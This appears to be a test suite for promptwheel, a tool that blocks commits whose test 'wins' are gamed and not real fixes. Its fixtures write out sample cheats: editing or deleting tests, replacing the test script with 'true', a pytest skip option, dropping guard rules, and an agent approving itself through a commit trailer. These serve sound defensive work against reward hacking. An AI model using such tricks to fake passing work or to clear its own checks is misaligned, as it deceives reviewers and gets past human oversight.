  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // BUG
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); commitAll(d, 'base: red');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(8));                               // the test-only "win"
  return d;
}
test('Promptwheel-Allow: a gamed win declared intentional reads PASS, recorded in report.allowed', () => {
  const d = gamedRepo();
  commitAll(d, 'correct the test\n\nPromptwheel-Allow: the old test asserted the wrong value');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.ok(r.allowed && r.allowed.reason.includes('wrong value') && r.allowed.cleared.includes('tests_pass'), JSON.stringify(r.allowed));
  assert.equal(r.metrics[0].allowed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('Promptwheel-Allow: the --allow / allow option overrides for a committed or working run', () => {
  const d = gamedRepo();
  commitAll(d, 'edit the test, no declaration');
  assert.equal(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');   // undeclared = gamed
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD', allow: 'the spec changed to 8' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.equal(r.allowed.reason, 'the spec changed to 8');
  rmSync(d, { recursive: true, force: true });
});
test('Sawbuck-Allow (alias): covers an intentional test DELETE (not just an edit)', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test *.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); commitAll(d, 'base: red');
  execFileSync('git', ['rm', '-q', 'calc.test.mjs'], { cwd: d });
  writeFileSync(join(d, 'keep.test.mjs'), "import { test } from 'node:test'; test('noop', () => {});\n");
  commitAll(d, 'drop the obsolete test\n\nSawbuck-Allow: the feature was removed, its test is obsolete');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));   // without the trailer this is GAMED (proven elsewhere)
  assert.ok(r.allowed, 'the delete was acknowledged');
  rmSync(d, { recursive: true, force: true });
});
test('allowTrailer: false and PROMPTWHEEL_NO_ALLOW_TRAILER stop a trailer clearing a gamed win; the flag still does', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-notrailer-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  const cfg = { repeat: 1, metrics: [{ name: 'ok', cmd: 'node check.test.mjs', extract: 'exit', direction: 'pass', guard: true }] };
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(1);\n');
  writeFileSync(join(d, 'src.js'), 'export const a = 1;\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  commitAll(d, 'base');
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
  commitAll(d, 'the test now passes\n\nPromptwheel-Allow: an agent approving itself');
  const run = (extra = [], env = {}) => { try { return { code: 0, out: execFileSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...extra], { cwd: d, encoding: 'utf8', env: { ...process.env, ...env }, stdio: ['ignore', 'pipe', 'ignore'] }) }; } catch (e) { return { code: e.status, out: String(e.stdout) }; } };
  assert.equal(run().code, 0, 'the default keeps the documented trailer');
  assert.equal(run([], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 2, 'off by the caller: gamed');
  assert.equal(run(['--allow', 'a person read it'], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 0, 'the flag still counts');
  // off by the contract at the base ref; a change that re-enables it in the same diff does not get the trailer
  g(['reset', '-q', '--hard', 'HEAD~1']);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, allowTrailer: false })); commitAll(d, 'contract: trailers off');
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  commitAll(d, 'pass, and trailers back on\n\nPromptwheel-Allow: an agent approving itself');
  assert.notEqual(run().code, 0, 'the committed contract holds');
});

test('Promptwheel-Allow: a trailer with no reason does NOT override (still gamed); the retired Allow-Gamed name is not honored', () => {
  const d = gamedRepo();
  commitAll(d, 'edit\n\nPromptwheel-Allow:   ');   // empty reason
  assert.equal(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');
  rmSync(d, { recursive: true, force: true });
  const d2 = gamedRepo();
  commitAll(d2, 'edit\n\nAllow-Gamed: a reason under the dropped trailer name');
  assert.equal(check({ repo: d2, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');
  rmSync(d2, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: usage/config errors exit 64, never a verdict code
test('a broken config exits 64 (EX_USAGE), so a typo can never read as GAMED (2) in CI', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'promptwheel.config.json'), '{ "metrics": [ this is not json');   // malformed
  let r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /invalid config/);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [] }));   // no metrics
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /non-empty array/);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './missing.json', metrics: [TODOS] }));
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /extends target not found/);
  r = pw(d, ['init', '--preset', 'nope']);                  // unknown preset
  assert.equal(r.code, 64, r.out);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: CLI entry (version / help / unknown)
test('cli: --version prints the package version (exit 0); --help exits 0; an unknown command exits 64', () => {
  const pkgVersion = JSON.parse(readFileSync(join(dirname(ENGINE), '..', 'package.json'), 'utf8')).version;
  const d = tmpRepo([TODOS]);
  let r = pw(d, ['--version']);
  assert.equal(r.code, 0); assert.equal(r.out.trim(), pkgVersion);
  r = pw(d, ['-v']);
  assert.equal(r.code, 0); assert.equal(r.out.trim(), pkgVersion);
  r = pw(d, ['--help']);
  assert.equal(r.code, 0); assert.match(r.out, /promptwheel run/);
  r = pw(d, []);
  assert.equal(r.code, 0); assert.match(r.out, /promptwheel run/);
  r = pw(d, ['frobnicate']);
  assert.equal(r.code, 64); assert.match(r.out, /unknown command: frobnicate/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: build-setup detection (inert gap)
test('init: detects a build step so a build-dependent gate measures instead of reading inert', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-build-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), 'dist/\n.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'b', scripts: { build: 'mkdir -p dist && cp src.mjs dist/index.mjs', test: 'node --test app.test.mjs 2>&1' } }));
  writeFileSync(join(d, 'src.mjs'), 'export const v = 1;\n');
  writeFileSync(join(d, 'app.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { v } from './dist/index.mjs'; test('v', () => assert.strictEqual(v, 2));\n");
  commitAll(d, 'base: red, test wants v===2');
  writeFileSync(join(d, 'src.mjs'), 'export const v = 2;\n'); commitAll(d, 'fix: v=2');
  assert.equal(pw(d, ['init', '--force']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.match(cfg.setup || '', /npm run build/, 'init detected the build step');
  // WITH the build the gate measures the real 0->1 (PASS); the test imports dist/ the build makes
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /PASS/);
  // and with the setup stripped it is honestly inert (INCONCLUSIVE, exit 3), never a fake green
  delete cfg.setup; writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).code, 3);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 4: a win the engine cannot re-prove is never a pass
test('gaming: a test-only win plus a NEW BINARY file under src/ reads GAMED (the --binary patch applies; it used to read PASS)', () => {
  const d = gamedRepo();                       // calc.mjs has the bug, the test was edited to expect it
  mkdirSync(join(d, 'src'), { recursive: true });
  writeFileSync(join(d, 'src', 'blob.bin'), Buffer.from([0, 1, 2, 255, 0, 7, 9, 0]));   // a NUL byte: git treats it as binary
  commitAll(d, 'edit the test and add a blob');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].gamed, true);
  assert.equal(r.metrics[0].unprovable, undefined, 'the binary source patch applied, so the win was judged, not skipped');
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('deriveVerdict: an improved metric whose source-only re-run could not be applied is INCONCLUSIVE, never pass', () => {
  const j = judgeGaming({ direction: 'pass', before: 0, after: 1 }, { samples: [], hadSourceChange: true, applyFailed: true });
  assert.equal(j.gamed, null); assert.equal(j.unprovable, true);
  const improved = { name: 'tests_pass', guard: true, ok: true, status: 'improved' };
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }]), 'inconclusive');
  assert.equal(verdictExitCode(deriveVerdict([{ ...improved, gamed: null, unprovable: true }])), 3);
  assert.equal(deriveVerdict([{ ...improved, gamed: false, retained: 1 }]), 'pass');
  assert.equal(deriveVerdict([{ ...improved, gamed: true }]), 'gamed');
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }, { name: 'x', guard: true, ok: false, status: 'regressed' }]), 'fail');   // fail still outranks
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }], null, true), 'fail');                                                  // so does a mandate
  assert.equal(deriveVerdict([{ name: 'g', guard: true, ok: true, status: 'unchanged', inert: true }]), 'inconclusive');                               // the inert rule still holds
  assert.equal(deriveVerdict([{ name: 'g', guard: true, ok: true, status: 'unchanged', inert: true }, { ...improved, gamed: false }]), 'pass');       // and still never buries a real win
  // the contract check refuses a pass that carries an unprovable win
  const rep = { base: 'a', head: 'b', repeat: 1, mode: 'refs', verdict: 'pass', metrics: [{ name: 'tests_pass', direction: 'pass', guard: true, before: 0, after: 1, delta: 1, status: 'improved', ok: true, confidence: 'high', noise: 0, gamed: null, unprovable: true }] };
  assert.equal(conformsToContract(rep).ok, false);
  assert.match(conformsToContract(rep).errors.join('; '), /unprovable/);
  assert.equal(conformsToContract({ ...rep, verdict: 'inconclusive' }).ok, true, conformsToContract({ ...rep, verdict: 'inconclusive' }).errors.join('; '));
});

// --------------------------------------------- review 4: git preconditions are usage errors (64), never a verdict
test('exit 64: a non-repo cwd, a base ref missing from this clone (shallow-checkout hint), a single commit with no --base', () => {
  const nonRepo = mkdtempSync(join(tmpdir(), 'pw-norepo-'));
  let r = pw(nonRepo, ['run', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /not inside a git repository/);
  assert.doesNotMatch(r.out, /at .*promptwheel\.mjs:\d+/, 'no stack trace');
  assert.doesNotMatch(r.out, /fatal:/, 'git\'s own stderr is not leaked above the usage line');
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'only');
  r = pw(d, ['run', '--base', '0000000000000000000000000000000000000000', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /base ref "0{40}" is not in this clone/); assert.match(r.out, /fetch-depth: 0/);
  r = pw(d, ['run', '--no-record']);              // one commit, no trunk to merge-base against, no HEAD~1
  assert.equal(r.code, 64, r.out); assert.match(r.out, /no commit to compare against/); assert.match(r.out, /--working/);
  // the library throws the same ConfigError
  for (const opts of [{ repo: d, base: '0000000000000000000000000000000000000000' }, { repo: d }, { repo: nonRepo }]) {
    let err = null; try { check(opts); } catch (e) { err = e; }
    assert.ok(err && err.name === 'ConfigError' && err.exitCode === 64, `${JSON.stringify(opts)} -> ${err && err.message}`);
  }
  rmSync(d, { recursive: true, force: true }); rmSync(nonRepo, { recursive: true, force: true });
});

// ------------------------------------- review 5: the apply-failure path through the real gate, and --allow over it
test('gaming: a source-only patch git cannot apply reads INCONCLUSIVE through the real gate (exit 3), and --allow clears it to PASS', () => {
  // `golden` is a symlink at base; its own change is non-source (the golden pattern), so the source slice
  // only CREATES golden/x.js, beneath the base worktree's symlink, and git apply refuses on both attempts
  // ("beyond a symbolic link"). The test-only edit greens the suite, so there is a win to re-prove.
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // BUG
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2));
  mkdirSync(join(d, 'fixtures')); writeFileSync(join(d, 'fixtures', 'data.txt'), 'data\n');
  symlinkSync('fixtures', join(d, 'golden'));
  commitAll(d, 'base: red, golden is a symlink to fixtures');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(8));                               // the test-only "win"
  unlinkSync(join(d, 'golden')); mkdirSync(join(d, 'golden')); writeFileSync(join(d, 'golden', 'x.js'), 'export const x = 1;\n');
  commitAll(d, 'edit the test; materialize golden');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.metrics[0].unprovable, true, JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].gamed, null);
  assert.equal(r.verdict, 'inconclusive');
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 3, cli.out); assert.match(cli.out, /INCONCLUSIVE/i);
  // the declared override covers exactly this uncertainty: 0.7.9 left it with no way to pass
  const a = check({ repo: d, base: 'HEAD~1', head: 'HEAD', allow: 'expectation was wrong' });
  assert.equal(a.verdict, 'pass', JSON.stringify(a));
  assert.deepEqual(a.allowed.cleared, ['tests_pass']); assert.equal(a.allowed.reason, 'expectation was wrong');
  assert.equal(a.metrics[0].unprovable, false); assert.equal(a.metrics[0].allowed, true);
  assert.equal(conformsToContract(a).ok, true, conformsToContract(a).errors.join('; '));
  const cliA = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--allow', 'expectation was wrong']);
  assert.equal(cliA.code, 0, cliA.out); assert.match(cliA.out, /allowed: tests_pass/);
  // unprovable:false is only a conforming shape when a declared override produced it
  const stripped = JSON.parse(JSON.stringify(a)); delete stripped.metrics[0].allowed;
  assert.equal(conformsToContract(stripped).ok, false);
  assert.match(conformsToContract(stripped).errors.join('; '), /allowed must be true/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 5: an unknown flag exits 64 on every command
test('cli: an unknown flag is a usage error (64) on every command, never silently ignored; --help after a command is help', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  for (const argv of [['run', '--bogus-flag', '--no-record'], ['init', '--preset', 'antihack', '--forced'], ['lock', '--nope']]) {
    const r = pw(d, argv);
    assert.equal(r.code, 64, `${argv.join(' ')} -> ${r.out}`);
    assert.match(r.out, /unknown flag --/, argv.join(' ')); assert.match(r.out, /promptwheel --help/);
    assert.doesNotMatch(r.out, /at .*promptwheel\.mjs:\d+/, 'no stack trace');
  }
  let r = pw(d, ['run', '--help']);
  assert.equal(r.code, 0, r.out); assert.match(r.out, /promptwheel run/);
  // the documented flags still work, with and without values
  r = pw(d, ['run', '--working', '--no-record', '--json', '--no-detect-gaming', '--repeat', '1']);
  assert.equal(r.code, 0, r.out); assert.equal(JSON.parse(r.out).verdict, 'pass');
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record', '--allow', 'a reason', '--markdown']);
  assert.equal(r.code, 0, r.out);
  r = pw(d, ['init', '--list']);
  assert.equal(r.code, 0, r.out); assert.match(r.out, /supply-chain/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- 0.8.0: the smaller surface
test('cli: the removed commands and presets are usage errors (64), never a verdict; the kept presets remain', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  for (const cmd of ['improve', 'insights', 'guards', 'conformance']) {
    const r = pw(d, [cmd]);
    assert.equal(r.code, 64, `${cmd} -> ${r.out}`); assert.match(r.out, new RegExp(`unknown command: ${cmd}`));
  }
  const listed = pw(d, ['init', '--list']).out.split('\n').filter((l) => l.startsWith('  ')).map((l) => l.trim().split(/\s+/)[0]);
  assert.deepEqual(listed.sort(), ['antihack', 'no-ai-tells', 'supply-chain']);
  for (const preset of ['tests-pass', 'lint', 'bundle-size', 'security', 'llm-eval', 'security-antihack']) {
    const r = pw(d, ['init', '--preset', preset, '--force']);
    assert.equal(r.code, 64, `${preset} -> ${r.out}`); assert.match(r.out, /unknown preset/);
  }
  rmSync(d, { recursive: true, force: true });
});

test('run: --no-record stays accepted (Sawbuck passes it on every check) and no run writes a record', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'fix');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']).code, 0);
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']).code, 0);
  assert.equal(existsSync(join(d, '.promptwheel')), false);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 5: the plugin's versions agree
test('plugin: the plugin version matches the marketplace entry', () => {
  const root = join(dirname(ENGINE), '..');
  const plugin = JSON.parse(readFileSync(join(root, 'plugins/promptwheel/.claude-plugin/plugin.json'), 'utf8'));
  const market = JSON.parse(readFileSync(join(root, '.claude-plugin/marketplace.json'), 'utf8'));
  assert.equal(market.plugins.find((x) => x.name === 'promptwheel').version, plugin.version, 'plugin.json and marketplace.json agree on the version');
});

// ------------------------------------------------------ review 4: check({ repo }) from a subdirectory
test('check: a repo path that names a subdirectory gates at the repository root', () => {
  const d = tmpRepo([TODOS]);
  mkdirSync(join(d, 'packages', 'api'), { recursive: true });
  writeFileSync(join(d, 'packages', 'api', 'app.js'), 'a // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'packages', 'api', 'app.js'), 'a\n');
  const r = check({ repo: join(d, 'packages', 'api'), working: true });
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].name, 'todos', 'the ROOT config was used, not an auto-config of the subdir');
  assert.equal(existsSync(join(d, 'packages', 'api', '.promptwheel')), false, 'nothing is written in the subdir');
  rmSync(d, { recursive: true, force: true });
});

// -------------------------------------------- review 4: one patched worktree re-proves every improved metric
test('gaming: two improved metrics are re-proven in ONE source-only checkout (setup runs 3 times, not 4)', () => {
  const log = join(mkdtempSync(join(tmpdir(), 'pw-setups-')), 'setups.log');
  const d = tmpRepo([
    TODOS,
    { name: 'fixme', cmd: 'grep -rn FIXME . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'down', guard: true },
  ]);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  cfg.setup = `echo setup >> ${JSON.stringify(log)}`;
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // FIXME\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'fix both');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  for (const m of r.metrics) { assert.equal(m.status, 'improved', m.name); assert.equal(m.gamed, false, m.name); assert.equal(m.retained, 1, m.name); }
  const setups = readFileSync(log, 'utf8').split('\n').filter(Boolean).length;
  assert.equal(setups, 3, `base + head + ONE source-only checkout, got ${setups}`);
  rmSync(d, { recursive: true, force: true }); rmSync(dirname(log), { recursive: true, force: true });
});

// ------------------------------------------- launch audit 2026-11-04: holes found by running the published packages
const repoWith = (files) => {
  const d = mkdtempSync(join(tmpdir(), 'pw-hole-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  for (const [f, c] of Object.entries(files)) { mkdirSync(join(d, dirname(f)), { recursive: true }); writeFileSync(join(d, f), c); }
  commitAll(d, 'base'); return d;
};
const NODE_TEST = (body) => `require('node:test').test('t', () => require('node:assert').equal(${body}))\n`;
const js = (test) => ({ 'package.json': JSON.stringify({ name: 'a', scripts: { test } }), 'src/a.js': 'exports.f = () => 1\n', 'test/a.test.js': NODE_TEST("require('../src/a.js').f(), 2") });
const gateRun = (d, extra = []) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json', ...extra]); return { code: r.code, rep: JSON.parse(r.out) }; };
const cfgOf = (cmd) => JSON.stringify({ repeat: 1, metrics: [{ name: 'tests_pass', cmd, extract: 'exit', direction: 'pass', guard: true }] });

test('a test command edited in package.json cannot carry a win; a real source fix still does', () => {
  let d = repoWith({ ...js('node --test'), 'promptwheel.config.json': cfgOf('npm test --silent') });
  const pkg = JSON.parse(readFileSync(join(d, 'package.json'), 'utf8'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, scripts: { test: 'true' } })); commitAll(d, 'cheat');
  assert.equal(gateRun(d).rep.verdict, 'gamed');
  d = repoWith({ ...js('node --test'), 'promptwheel.config.json': cfgOf('npm test --silent') });
  const p2 = JSON.parse(readFileSync(join(d, 'package.json'), 'utf8'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...p2, dependencies: {} }));
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2\n'); commitAll(d, 'real fix, package.json edited too');
  assert.equal(gateRun(d).rep.verdict, 'pass');
});

test('pytest options in pyproject.toml cannot carry a win', () => {
  const py = { 'pyproject.toml': '[project]\nname = "a"\n\n[tool.x]\ny = 1\n', 'promptwheel.config.json': cfgOf("sh -c 'grep -q skipall pyproject.toml'") };
  const d = repoWith(py);
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "a"\n\n[tool.pytest.ini_options]\naddopts = "skipall"\n\n[tool.x]\ny = 1\n'); commitAll(d, 'cheat');
  assert.equal(gateRun(d).rep.verdict, 'gamed');
});

test('moving a file out of a protected path touches that path', () => {
  const d = repoWith({ 'src/auth/login.js': 'x\n', 'promptwheel.config.json': JSON.stringify({ ...JSON.parse(cfgOf('true')), mandates: [{ name: 'auth', paths: ['src/auth/**'], reason: 'auth' }] }) });
  execFileSync('git', ['mv', 'src/auth/login.js', 'src/login.js'], { cwd: d }); commitAll(d, 'move');
  const r = gateRun(d); assert.equal(r.code, 1); assert.ok(r.rep.mandates.some((m) => m.name === 'auth'));
});

test('the preset freezes the contract: weakening it alone fails, a person lifts it with --allow, a trailer cannot', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, mandates: [] }, null, 2)); commitAll(d, 'drop the rules\n\nPromptwheel-Allow: because');
  assert.equal(gateRun(d).code, 1, 'a trailer does not lift it');
  assert.equal(gateRun(d, ['--allow', 'a person retired these']).code, 0);
});

test('a green held by test edits gets a note, not a verdict; an honest fix gets neither', () => {
  const pass = { 'package.json': JSON.stringify({ name: 'a', scripts: { test: 'node --test' } }), 'src/a.js': 'exports.f = () => 2\n', 'test/a.test.js': NODE_TEST("require('../src/a.js').f(), 2"), 'promptwheel.config.json': cfgOf('npm test --silent') };
  let d = repoWith(pass);
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 3\n'); writeFileSync(join(d, 'test/a.test.js'), NODE_TEST('1, 1')); commitAll(d, 'break it, neuter the test');
  let r = gateRun(d); assert.equal(r.rep.verdict, 'pass'); assert.equal(r.rep.metrics[0].heldByTestEdit, true);
  d = repoWith(pass);
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2 // same\n'); writeFileSync(join(d, 'test/a.test.js'), NODE_TEST("require('../src/a.js').f(), 2") + '// more\n'); commitAll(d, 'honest');
  r = gateRun(d); assert.equal(r.rep.metrics[0].heldByTestEdit, undefined);
});

test('deriveVerdict: a tripwire moving is not a win over a test that never ran', () => {
  assert.equal(deriveVerdict([{ name: 't', guard: true, ok: true, status: 'unchanged', inert: true }, { name: 'c', guard: true, ok: true, status: 'improved', tripwire: true }]), 'inconclusive');
});

test('a report guard tells you and does not fail; a plain message says what changed', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, mandates: c.mandates.filter((m) => m.name !== 'contract-frozen'), metrics: c.metrics.map((m) => (m.name === 'dependency_entries' ? { ...m, report: true } : m)) }, null, 2)); commitAll(d, 'report mode');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', dependencies: { ms: '2.1.3' } })); commitAll(d, 'dep');
  const r = gateRun(d);
  const dep = r.rep.metrics.find((m) => m.name === 'dependency_entries');
  assert.equal(dep.noted, true); assert.equal(dep.status, 'regressed');
  assert.ok(r.rep.explained.some((x) => x.what === 'a new dependency' && x.noted));
});
test('a report flag does not soften a guard that is not marked', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { postinstall: 'x' } })); commitAll(d, 'script');
  const r = gateRun(d); assert.equal(r.code, 1); assert.ok(r.rep.explained.some((x) => x.what === 'a new install script'));
});
test('approval on a PR: the newest comment from someone with write access; never a bot or a drive-by', () => {
  const c = (body, assoc = 'OWNER', type = 'User', login = 'pat') => ({ body, author_association: assoc, user: { type, login } });
  assert.equal(allowFromComments([]), '');
  assert.equal(allowFromComments([c('looks fine')]), '');
  assert.equal(allowFromComments([c('sawbuck-allow: x', 'NONE')]), '', 'a stranger');
  assert.equal(allowFromComments([c('sawbuck-allow: x', 'OWNER', 'Bot')]), '', 'a bot');
  assert.equal(allowFromComments([c('sawbuck-allow:   ')]), '', 'no reason');
  assert.equal(allowFromComments([c('sawbuck-allow: old'), c('nice\nsawbuck-allow: added ms for parsing')]), 'added ms for parsing (approved by pat)');
});
